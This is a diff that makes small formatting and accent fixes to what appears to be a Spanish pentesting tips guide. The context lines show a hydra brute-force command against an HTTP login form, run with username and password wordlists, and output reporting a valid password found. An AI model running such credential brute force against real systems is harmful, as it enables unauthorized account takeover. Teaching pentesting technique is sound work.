@@ -473,7 +473,7 @@ Ahora cuando queramos iniciar un ataque al puerto ```8080``` de la maquina remot
 
 ## Tip #10: Fuerza bruta con hydra al protocolo HTTP
 ## Custom http login
-Se puede realizar fuerza bruta en logins personalizados solo obteniendo los parametros a enviar en la petición, esto se realiza mediante burpsuite y posteriormente se especifica a hydra de la siguiente forma ````dominio metodo "/ruta-del-login:parametro1=^USER^&parametro2=^PASS^&Login=Login:'texto si el login es invalido'"```
+Se puede realizar fuerza bruta en logins personalizados solo obteniendo los parametros a enviar en la petición, esto se realiza mediante burpsuite y posteriormente se especifica a hydra de la siguiente forma ```dominio metodo "/ruta-del-login:parametro1=^USER^&parametro2=^PASS^&Login=Login:'texto si el login es invalido'"```
 ```bash
 ┌──(root㉿pentest)-[~]
 └─# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt  -P /root/Desktop/wordlists/100-common-passwords.txt target.com http-post-form \ "/login:username=^USER^&password=^PASS^&Login=Login:Invalid username or password"
@@ -486,7 +486,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 04:57:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-14 04:58:05
 ```
-## Tip #11: Busqueda de informacion con grep
+## Tip #11: Busqueda de información con grep
 En ocaciones puedes archivos de configuracion por medio de palabras clave entre muchos archivos con ```grep``` de la siguiente forma:
 ```bash
 root@pentest:/app# ls
